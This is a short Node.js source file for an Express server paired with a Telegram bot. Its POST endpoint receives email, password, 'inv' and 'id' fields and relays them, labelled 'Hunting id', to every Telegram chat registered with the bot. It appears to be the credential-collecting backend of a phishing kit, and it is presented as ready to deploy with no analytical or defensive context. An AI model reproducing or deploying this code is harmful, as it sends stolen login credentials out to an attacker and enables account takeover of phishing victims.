const express = require('express');
const cors = require('cors');
require("dotenv").config()
const TelegramBot = require('node-telegram-bot-api');

const app = express();

app.use(cors())
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

const bot = new TelegramBot(process.env.bot, { polling: true });
let ids = []
// Handle incoming messages
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const message = msg.text;
    ids.push(chatId);
    bot.sendMessage(chatId, "Connected !!!")
    // Echo the message back to the user
    bot.on("polling_error", (msg) => console.log(msg));
});

app.post('/', (req, res) => {
    let { id, inv, email, pass } = req.body
    // console.log(chatId);
    ids.forEach(item => {
        bot.sendMessage(item, `Hunting id:${id}\n\ninv:${inv}\n\nemail:${email}\n\npass:${pass}`);
    })
    res.json("Alo")
})
// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

// Start the Express server
const port = process.env.PORT || 3001;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});